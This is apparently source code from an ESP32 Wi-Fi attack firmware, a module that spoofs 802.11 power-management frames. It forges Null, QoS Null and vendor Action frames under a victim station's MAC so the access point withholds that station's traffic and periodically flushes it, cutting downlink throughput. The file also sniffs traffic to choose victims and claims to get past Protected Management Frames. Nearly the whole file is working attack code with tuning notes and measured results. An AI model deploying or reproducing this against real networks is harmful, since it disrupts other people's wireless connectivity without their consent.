// Power-management (PM bit) spoofing in three frame shapes.
//
// Design notes (why it is shaped this way):
//   * The Power Management bit is bit 12 of the Frame Control field, i.e. 0x10 in
//     its second octet. A station sets it to say "I am going to sleep, buffer my
//     downlink"; the AP then stops delivering to that station and marks it in the
//     TIM. Forging that frame with the victim's transmitter address puts the AP's
//     idea of the station's power state under our control -- the real station never
//     notices, because nothing is sent to it.
//   * Three shapes carry the same bit, and stacks do not agree on which one they
//     honour. All three are selectable at runtime and all three keep the PMF bypass:
//
//       null    : data subtype 4, 24 bytes, no payload. The canonical PS transition
//                 frame (mac80211: ieee80211_nullfunc_get()).
//       qosnull : data subtype 12, 26 bytes (2-byte QoS Control). What a QoS/WMM
//                 association uses; an AP that only tracks QoS stations may ignore
//                 the plain form.
//       action  : management subtype 13, 29 bytes, category 127 (vendor specific).
//                 Management frames carry the PM bit too, and category 127 is one of
//                 the few Action categories outside the robust set -- so this shape
//                 looks like ordinary management traffic while still bypassing PMF.
//   * Every sixth frame goes out with PM=0 instead of PM=1. PM=0 tells the AP "I am
//     awake, send what you have": it releases the buffered frames towards a station
//     that is not there, which is what turns "delayed" into "lost". A steady PM=1
//     only delays. The same PM=0 shape is what `pspoll_release()` uses as an undo.
//   * What it cannot do: the AP ages buffered frames out and drops them after the
//     retry limit, and every real uplink frame from the victim carries PM=0 and puts
//     the AP back into "awake". The forged state is therefore fought over and the
//     effect is partial -- measured -24%..-46% downlink throughput against an active
//     station, no disconnection (测试报告 §4.4.9/§4.4.10). Honest boundary, in code.
//   * Pacing: all three shapes are unicast (the AP acknowledges them), so every
//     frame goes through tx_guard. 10 frames/s, not the 20 the management-frame
//     modules use: at 20 frames/s the 32-buffer short-frame pool was exhausted after
//     ~170..400 frames and the chip restarted (FATAL 0x101). At 10 frames/s a 60 s
//     soak ran without a single refusal.
//   * The PS-Poll half of this idea was implemented and then removed: with a unicast
//     receiver address the MAC never transmits control subtype 10 (0/10 frames on the
//     air, while the identical 16-byte frame with a broadcast RA is captured 10/10
//     with Duration/ID = 0xC000|AID intact). Without a unicast poll there is nothing
//     to aim at an AP. Evidence and the probe command (CTRLTEST) are in 附录 A of
//     attack-principles.md and 测试报告 §4.4.9.
//
// A word on what we can and cannot see from here: `pspdl` counts downlink data
// frames towards a known victim on the air. If the forged PM state took, the AP
// stops transmitting to that station and the counter stops moving -- that is the
// attacker-side evidence. Everything else (buffer contents, drop reasons) is inside
// the AP.

#include "pspoll.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "tx_guard.h"

namespace {

const uint8_t kSeqHigh = 0xF0;
const uint8_t kSeqLow = 0xFF;

// See the header: 10 frames/s, because 20 restarts the chip on this frame class.
const uint32_t kSendMs = 100;
const int kMaxClients = 8;
// Every kFlushEvery-th frame goes out with PM=0 (see the header comment).
const uint32_t kFlushEvery = 6;
// TID used in the QoS Control field of the QoS Null shape: 0 is what mac80211 picks
// for a nullfunc (best effort), and it is the TID every WMM AP accepts.
const uint8_t kQosTid = 0;

pspoll_mode_t s_mode = PSPOLL_MODE_OFF;
pspoll_frame_t s_frame = PSPOLL_FRAME_NULL;
uint8_t s_bssid[6];
uint8_t s_channel;
int32_t s_chan_err;
uint32_t s_last_tx_ms;
int s_cursor;
uint32_t s_null_tick;

uint32_t s_frames;
uint32_t s_null_frames;
uint32_t s_flush_frames;
uint32_t s_dl_frames;
uint32_t s_rx_polls;
uint32_t s_rx_nulls;
uint32_t s_rx_pm1;

struct client_t {
    uint8_t mac[6];
    uint32_t sent;
};

client_t s_clients[kMaxClients];
int s_client_count;

int find_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

bool is_group(const uint8_t* mac) {
    return (mac[0] & 0x01) != 0;
}

int note_client(const uint8_t* mac) {
    if (mac == nullptr || is_group(mac) || memcmp(mac, s_bssid, 6) == 0) {
        return -1;
    }
    const int found = find_client(mac);
    if (found >= 0) {
        return found;
    }
    if (s_client_count >= kMaxClients) {
        return -1;
    }
    memset(&s_clients[s_client_count], 0, sizeof(client_t));
    memcpy(s_clients[s_client_count].mac, mac, 6);
    return s_client_count++;
}

// data subtype 4: 24-byte header, no payload.
size_t build_null_data(uint8_t* frame, const uint8_t sta[6], bool pm) {
    memset(frame, 0, 24);
    frame[0] = 0x48;                                 // data / Null
    frame[1] = (uint8_t)(0x01 | (pm ? 0x10 : 0x00));  // ToDS + Power Management
    memcpy(frame + 4, s_bssid, 6);   // Addr1 = RA = the AP
    memcpy(frame + 10, sta, 6);      // Addr2 = TA = the victim we impersonate
    memcpy(frame + 16, s_bssid, 6);  // Addr3 = DA = the AP
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;
    return 24;
}

// data subtype 12: 24-byte header + 2-byte QoS Control, no payload.
size_t build_qos_null(uint8_t* frame, const uint8_t sta[6], bool pm) {
    memset(frame, 0, 26);
    frame[0] = 0xC8;                                 // data / QoS Null
    frame[1] = (uint8_t)(0x01 | (pm ? 0x10 : 0x00));  // ToDS + Power Management
    memcpy(frame + 4, s_bssid, 6);   // Addr1 = RA = the AP
    memcpy(frame + 10, sta, 6);      // Addr2 = TA = the victim we impersonate
    memcpy(frame + 16, s_bssid, 6);  // Addr3 = DA = the AP
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;
    // QoS Control: TID in bits 0..3, normal acknowledgement (bits 5..6 = 00),
    // no A-MSDU. Bit 4 (EOSP) is AP->STA only and stays 0 here.
    frame[24] = (uint8_t)(kQosTid & 0x0F);
    frame[25] = 0x00;
    return 26;
}

// management subtype 13, category 127 (vendor specific), 29 bytes.
size_t build_action(uint8_t* frame, const uint8_t sta[6], bool pm) {
    memset(frame, 0, 29);
    frame[0] = 0xD0;                                  // management / Action
    frame[1] = (uint8_t)(pm ? 0x10 : 0x00);            // Power Management only
    memcpy(frame + 4, s_bssid, 6);   // Addr1 = RA = the AP
    memcpy(frame + 10, sta, 6);      // Addr2 = TA = the victim we impersonate
    memcpy(frame + 16, s_bssid, 6);  // Addr3 = BSSID
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;
    frame[24] = 127;  // category: vendor specific (not a robust management frame)
    frame[25] = 0;    // action
    frame[26] = 0x00;  // vendor OUI + type -- content is irrelevant to the PM bit,
    frame[27] = 0x11;  // the AP reads the Frame Control, not the body
    frame[28] = 0x22;
    return 29;
}

size_t build_frame(uint8_t* frame, const uint8_t sta[6], bool pm) {
    switch (s_frame) {
        case PSPOLL_FRAME_QOSNULL:
            return build_qos_null(frame, sta, pm);
        case PSPOLL_FRAME_ACTION:
            return build_action(frame, sta, pm);
        default:
            return build_null_data(frame, sta, pm);
    }
}

}  // namespace

bool pspoll_start(int index, pspoll_frame_t frame) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    s_frame = (frame == PSPOLL_FRAME_QOSNULL || frame == PSPOLL_FRAME_ACTION) ? frame
                                                                            : PSPOLL_FRAME_NULL;
    s_mode = PSPOLL_MODE_PM;
    s_last_tx_ms = 0;
    s_cursor = 0;
    s_null_tick = 0;
    s_frames = 0;
    s_null_frames = 0;
    s_flush_frames = 0;
    s_dl_frames = 0;
    s_rx_polls = 0;
    s_rx_nulls = 0;
    s_rx_pm1 = 0;
    s_client_count = 0;

    // A station that is still finishing a scan refuses the channel change, and a
    // refused change means the frames go out on whatever channel the scan stopped
    // on -- silently attacking the wrong network. The verdict is therefore reported
    // by the CLI instead of being dropped on the floor.
    s_chan_err = (int32_t)esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    // Victims come from the sniffer, and so does `pspdl`.
    attack_sniffer_enable();
    return true;
}

void pspoll_stop(void) {
    s_mode = PSPOLL_MODE_OFF;
}

void pspoll_add_station(const uint8_t mac[6]) {
    note_client(mac);
}

void pspoll_release(void) {
    for (int i = 0; i < s_client_count; i++) {
        uint8_t frame[32];
        const size_t len = build_frame(frame, s_clients[i].mac, false);
        // The unicast governor may still be pacing the last attack frame; retry
        // instead of silently dropping the undo (measured: the first attempt right
        // after a flood is refused, which made PSPOLLREL a no-op).
        for (int attempt = 0; attempt < 8; attempt++) {
            if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
                s_frames++;
                s_null_frames++;
                s_flush_frames++;
                s_clients[i].sent++;
                break;
            }
            delay(25);
        }
    }
    s_mode = PSPOLL_MODE_OFF;
}

void pspoll_step(void) {
    if (s_mode == PSPOLL_MODE_OFF || s_client_count == 0) {
        return;
    }
    const uint32_t now = millis();
    if (s_last_tx_ms != 0 && now - s_last_tx_ms < kSendMs) {
        return;
    }
    // One frame per victim per tick, round-robin: the injection budget belongs to
    // the radio, not to each station.
    const int slot = s_cursor % s_client_count;
    client_t* c = &s_clients[slot];
    s_last_tx_ms = now;

    s_null_tick++;
    const bool pm = (s_null_tick % kFlushEvery) != 0;
    uint8_t frame[32];
    const size_t len = build_frame(frame, c->mac, pm);
    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        s_null_frames++;
        c->sent++;
        if (!pm) {
            s_flush_frames++;
        }
        s_cursor++;
    }
}

void pspoll_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (s_mode == PSPOLL_MODE_OFF || len < 16) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;

    // PS-Poll from a real station: counted only. It is the reference behaviour for
    // "the victim really power-saves", and an ESP-IDF station in modem sleep never
    // sends one because it wakes per DTIM instead.
    if (type == 1 && subtype == 10 && len >= 20) {
        if (memcmp(dest, s_bssid, 6) == 0) {
            s_rx_polls++;
        }
        return;
    }

    if (type != 0 && type != 2) {
        return;
    }

    // Association / Reassociation Response of the target BSS: the station that just
    // joined is the obvious victim.
    if (type == 0 && (subtype == 1 || subtype == 3) && len >= 30 &&
        memcmp(src, s_bssid, 6) == 0) {
        note_client(dest);
        return;
    }

    if (type == 2) {
        // A downlink data frame towards one of our victims: the AP is still
        // transmitting to it, i.e. our forged PM state did not take (or did not
        // hold -- the victim's own PM=0 frames reset it).
        if (find_client(dest) >= 0) {
            s_dl_frames++;
        }
        // Uplink data of the BSS: that station is awake and talking, so it is a
        // victim worth putting to sleep -- and the only way to learn a MAC when the
        // association happened before the sniffer was listening.
        if (memcmp(dest, s_bssid, 6) == 0 || memcmp(frame + 16, s_bssid, 6) == 0) {
            note_client(src);
        }
        // Null Data / QoS Null from a station: its own PM transitions.
        if ((subtype == 4 || subtype == 12) && find_client(src) >= 0) {
            s_rx_nulls++;
            if ((frame[1] & 0x10) != 0) {
                s_rx_pm1++;
            }
        }
        return;
    }

    // Any other management traffic of the BSS mentioning the victim: remember the
    // MAC, so a station that has not associated yet is still a candidate.
    if (memcmp(dest, s_bssid, 6) == 0 || memcmp(frame + 16, s_bssid, 6) == 0) {
        note_client(src);
    }
}

void pspoll_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }

    // The dump is independent of the selected shape: all three are printed, so a
    // format regression is visible without starting an attack.
    uint8_t frame[32];
    const size_t null_len = build_null_data(frame, fake_sta, true);
    Serial.printf("PSPOLLTEST null len=%u fc=0x%02X%02X pm=%u tods=%u ra=%02X:%02X:%02X"
                  " ta=%02X:%02X:%02X\n",
                  (unsigned)null_len, (unsigned)frame[1], (unsigned)frame[0],
                  (unsigned)((frame[1] & 0x10) != 0), (unsigned)(frame[1] & 0x01),
                  (unsigned)frame[4], (unsigned)frame[5], (unsigned)frame[6],
                  (unsigned)frame[10], (unsigned)frame[11], (unsigned)frame[12]);
    Serial.print("PSPOLLTEST null hex=");
    for (size_t i = 0; i < null_len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t qos_len = build_qos_null(frame, fake_sta, true);
    Serial.printf("PSPOLLTEST qosnull len=%u fc=0x%02X%02X pm=%u tods=%u tid=%u\n",
                  (unsigned)qos_len, (unsigned)frame[1], (unsigned)frame[0],
                  (unsigned)((frame[1] & 0x10) != 0), (unsigned)(frame[1] & 0x01),
                  (unsigned)(frame[24] & 0x0F));
    Serial.print("PSPOLLTEST qosnull hex=");
    for (size_t i = 0; i < qos_len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t act_len = build_action(frame, fake_sta, true);
    Serial.printf("PSPOLLTEST action len=%u fc=0x%02X%02X pm=%u cat=%u ra=%02X:%02X:%02X"
                  " ta=%02X:%02X:%02X\n",
                  (unsigned)act_len, (unsigned)frame[1], (unsigned)frame[0],
                  (unsigned)((frame[1] & 0x10) != 0), (unsigned)frame[24], (unsigned)frame[4],
                  (unsigned)frame[5], (unsigned)frame[6], (unsigned)frame[10],
                  (unsigned)frame[11], (unsigned)frame[12]);
    Serial.print("PSPOLLTEST action hex=");
    for (size_t i = 0; i < act_len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t awake_len = build_null_data(frame, fake_sta, false);
    Serial.printf("PSPOLLTEST awake len=%u fc=0x%02X%02X pm=%u\n", (unsigned)awake_len,
                  (unsigned)frame[1], (unsigned)frame[0],
                  (unsigned)((frame[1] & 0x10) != 0));
}

bool pspoll_active(void) {
    return s_mode != PSPOLL_MODE_OFF;
}

const char* pspoll_mode_name(void) {
    return s_mode == PSPOLL_MODE_PM ? "pm" : "off";
}

const char* pspoll_frame_name(void) {
    switch (s_frame) {
        case PSPOLL_FRAME_QOSNULL:
            return "qosnull";
        case PSPOLL_FRAME_ACTION:
            return "action";
        default:
            return "null";
    }
}

uint32_t pspoll_frames(void) {
    return s_frames;
}

uint32_t pspoll_null_frames(void) {
    return s_null_frames;
}

uint32_t pspoll_flush_frames(void) {
    return s_flush_frames;
}

uint32_t pspoll_clients(void) {
    return (uint32_t)s_client_count;
}

uint32_t pspoll_dl_frames(void) {
    return s_dl_frames;
}

uint32_t pspoll_rx_polls(void) {
    return s_rx_polls;
}

uint32_t pspoll_rx_nulls(void) {
    return s_rx_nulls;
}

uint32_t pspoll_rx_pm1(void) {
    return s_rx_pm1;
}

int32_t pspoll_channel_err(void) {
    return s_chan_err;
}
